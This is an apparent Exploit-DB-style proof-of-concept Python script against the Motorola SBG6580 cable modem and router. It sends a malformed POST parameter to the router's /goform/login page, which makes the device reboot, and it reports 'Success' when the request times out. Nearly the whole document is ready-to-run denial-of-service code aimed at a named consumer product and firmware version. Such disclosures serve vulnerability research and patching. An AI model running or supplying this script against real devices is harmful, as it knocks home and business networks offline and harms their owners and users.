# Exploit Title: Motorola SBG6580 Cable Modem & Wireless-N Router Denial of Service
# Date: 01/03/14
# Exploit Author: nicx0
# Vendor Homepage: http://www.motorola.com/
# Software Link: http://www.motorola.com/us/SBG6580-SURFboard%C2%AE-eXtreme-Wireless-Cable-Modem/70902.html
# Version: SBG6580-6.5.0.0-GA-00-226-NOSH
# POSTing a bad login page parameter causes the router to reboot.

import sys
import socket
import urllib2
import urllib
router_ip = ''
try:
      router_ip = str(sys.argv[1])
except:
      print 'motobug.py ip_address : e.g. motobug.py 192.168.0.1'
      sys.exit(2)
query_args = {'this_was':'too_easy'}
url = 'http://' + router_ip + '/goform/login'
post_data = urllib.urlencode(query_args)
request = urllib2.Request(url, post_data)
try:
	print '[+] Sending invalid POST request to ' + url + '...'
	response = urllib2.urlopen(request,timeout=5)
except socket.timeout:
	print '[+] Success! No response from the modem.'
except urllib2.HTTPError:
	print '[-] Failed: HTTP error received. The modem might not be a SBG6580.'
except urllib2.URLError:
	print '[-] Failed: URL error received. Check the IP address again..'
else:
	print '[-] Failed: HTTP response received. Modem does not appear to be vulnerable.'